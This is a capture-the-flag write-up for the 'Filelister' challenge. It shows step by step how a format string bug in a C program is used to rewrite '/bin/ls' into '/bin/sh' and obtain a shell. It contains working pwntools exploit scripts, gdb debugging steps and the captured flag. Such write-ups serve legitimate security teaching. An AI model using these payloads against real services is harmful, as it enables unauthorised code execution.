# Filelister

---

### Challenge Description

> Okay, after getting pwned three times in a row i've decided enough is enough. I'm just going to let u list files on my system. No shell for you!

> Interact with the service at: 3qo9k5hk5cprtqvnlkvotlnj9d14b7mt.ctf.sg:30301

> Concept(s) Required: Format String exploitation
 
[filelister.zip](https://github.com/caprinux/Cyberthon-2021-Training/files/6330488/filelister.zip)

---

### Solution

We are told there's a [format string vulerability](https://ctf101.org/binary-exploitation/what-is-a-format-string-vulnerability/#:~:text=A%20format%20string%20vulnerability%20is,the%20format%20argument%20to%20printf%20.).

_i wont be explaining what is format string vulnerability so check it out urself in the link above_

Let's read our source code.

```c
char COMMAND[8] = "/bin/ls\x00";

void shell()
{
    system(COMMAND);
}

int main()
{
    char username[256];
    ... some ascii art ...
    fgets(username, 63, stdin);
    printf("Greetings ");
    printf(username);
    printf("Here are my files!\n");
    shell();
    return 0;
```

As you can see, unlike previous challenges, this one does not have a buffer overflow. Our input is limited. 

But that is not a problem, we can easily exploit this with format string.

What the program does is, it takes in an input and then it calls the `shell()` function which does `system(COMMAND)`

What this does is that it executes `COMMAND` in the system. Since `char COMMAND[8] = "/bin/ls\x00";`

It executes /bin/ls which lists all the files in the current directory.

If we can change `/bin/ls` to `/bin/sh`, we will have ourselves a shell.

Let's find where `/bin/ls` is in the binary in GDB.

![image](https://user-images.githubusercontent.com/76640319/115134357-fc3b5f80-a041-11eb-9ff3-e8c3a7eda507.png)

In this case, we are trying to change only `ls` to `sh`.

Hence we find the address that contains just the last 2 letters.

![image](https://user-images.githubusercontent.com/76640319/115134375-15dca700-a042-11eb-8e15-d665ee889dc5.png)

Got it.

![image](https://user-images.githubusercontent.com/76640319/115134393-3c9add80-a042-11eb-9fce-2d4f307e6ea8.png)

`736c` is actually just `sl` which is `ls` in little endian.

We want to overwrite `736c` with `6873`. 

And to calculate the offset, we can do `0x16873 - 0x736c = 62727`

Now we know where our variable is and what we are going to overwrite it with.

To complete our format string payload, we need to find where our input is as well.

We can send a payload to test the location of our input:

![image](https://user-images.githubusercontent.com/76640319/115134437-9f8c7480-a042-11eb-8b67-91da354d618d.png)

As you can see, on the 6th address, we can see 0x41414141 which is our input AAAA and on the 7th address we can see 0x43434343 which is our input CCCC.

Hence we have our offset which is 6.

Now we can craft our exploit.

We will use `%6$n` to access address at `p64(0x60501d)` and add `62727` to `736c` at that address.

To string it up, it will look something like `p64(0x60501d) + %62727x + %6$n`

![image](https://user-images.githubusercontent.com/76640319/115134794-e9c32500-a045-11eb-802f-425cb042ac88.png)

However, as you can see, it did not work. We are still merely getting a list of our files.

From the output, we can also see that `b'%62727x' + b'%6$n'` is not getting printed out.

![image](https://user-images.githubusercontent.com/76640319/115134831-30b11a80-a046-11eb-971e-51aeebb74532.png)

As we can see, `p64(0x60501d)` has a null byte which stops reading everythinf after it. Hence our payload is being ignored.

How do we solve this? We can move p64(0x60501d) to the end of our payload.

`'%62727x' + '%6$n' + p64(0x60501d)`

However, if you we send this as our payload, you will get a segfault because `%6$n` will try to access the address `'%62727x'` which does not exist.

If you remember our previous payload where we sent `AAAABBBBCCCC.%x.%x.%x.%x.%x...` which gave us an output of `...41414141.43434343...`, it is apparent that our format string will only read the upper 4 bytes of every 8 bytes sent.

Hence if we do some math, we add some padding to ensure that the correct address is being read.

To help you visualize, the inputs being read in for `'%62727x' + '%6$n' + p64(0x60501d)` will be `%627 and 6$n + first char of address`

`'%62727x' + '%6$n' + 'CCCCC' + p64(0x60501d)` will have `%627, 6$nC,, address` read. Our new input offset is 8.

`'%62727x' + '%8$n' + p64(0x60501d)`. If you try this new payload, you will segfault. Perhaps our offset to change `736c to 6873` is wrong.

Let's have a look at what is actually in the address at 0x60501d during runtime with gdb.

```py
from pwn import *
p = process('./filelister')
gdb.attach(p,gdbscript='b *main+249') # breaks after printf calls, after our payload is sent
payload = b'aaaaaaa' + b'%8$n'+ b'CCCCC'+ p64(0x60105d) # we empty out our offset to have a look at the address in p64(0x60105d) without overwriting it
p.sendline(payload)
p.interactive()
```

![image](https://user-images.githubusercontent.com/76640319/115135280-082b1f80-a04a-11eb-84ff-1f78df4613ed.png)

We send continue to gdb to let it continue running our script. We will break after printf.

Next, we examine the value at 0x60105d.

![image](https://user-images.githubusercontent.com/76640319/115135295-2133d080-a04a-11eb-924f-caf69699287a.png)

Oh. It holds 0x7 at runtime.

Hence our offset should be `0x6873 - 0x7 = 26732`

We fire our exploit script.

```py
from pwn import *
p = process('./filelister')
gdb.attach(p,gdbscript='b *main+249') # breaks after printf calls, after our payload is sent
payload = b'%26732x' + b'%8$n'+ b'CCCCC'+ p64(0x60105d) # we empty out our offset to have a look at the address in p64(0x60105d) without overwriting it
p.sendline(payload)
p.interactive()
```

We segfault once again and we analyse p64(0x60105d) in gdb.

![image](https://user-images.githubusercontent.com/76640319/115135392-bc2caa80-a04a-11eb-9f12-374e00684465.png)

We see that the address is wrong. And we correct it by adding `0x6873 - 0x686c = 7` into our offset.

```py
from pwn import *
p = process('./filelister')
gdb.attach(p,gdbscript='b *main+249') # breaks after printf calls, after our payload is sent
payload = b'%26739x' + b'%8$n'+ b'CCCCC'+ p64(0x60105d) # we empty out our offset to have a look at the address in p64(0x60105d) without overwriting it
p.sendline(payload)
p.interactive()
```

We segfault again.

We analyse in gdb again;

![image](https://user-images.githubusercontent.com/76640319/115135425-f39b5700-a04a-11eb-8a59-6ef9e4a703b1.png)

Our address is correct. Perhaps theres some problems with running it locally.

We fire our script at the server. 🔥

```py
from pwn import *
#p = process('./filelister')
p = remote('3qo9k5hk5cprtqvnlkvotlnj9d14b7mt.ctf.sg', 30301)
#gdb.attach(p,gdbscript='b *main+249') # breaks after printf calls, after our payload is sent
payload = b'%26739x' + b'%8$n'+ b'CCCCC'+ p64(0x60105d) # we empty out our offset to have a look at the address in p64(0x60105d) without overwriting it
p.sendline(payload)
p.interactive()
```

![image](https://user-images.githubusercontent.com/76640319/115135515-a370c480-a04b-11eb-943a-8f08c85bab02.png)

Success! Such problems where exploit scripts work remotely but not locally vice versa is quite common in CTFs so we js deal with it 😙

```
CTFSG{f1l3l15t3r_m0r3_l1k3_sh3ll_pr0v1d3r}
```

---

### Food for thought

While learning to do formal string attacks manually is important and 100% necessary for you to understand how it works, are there faster ways or tools to automate this?

Here was my revised script after doing it manually:

```py
p = remote('3qo9k5hk5cprtqvnlkvotlnj9d14b7mt.ctf.sg', 30301)
offset = 6
payload = fmtstr_payload(offset, {0x60105d:0x6873})
p.sendline(payload)
p.clean()
p.interactive()
```
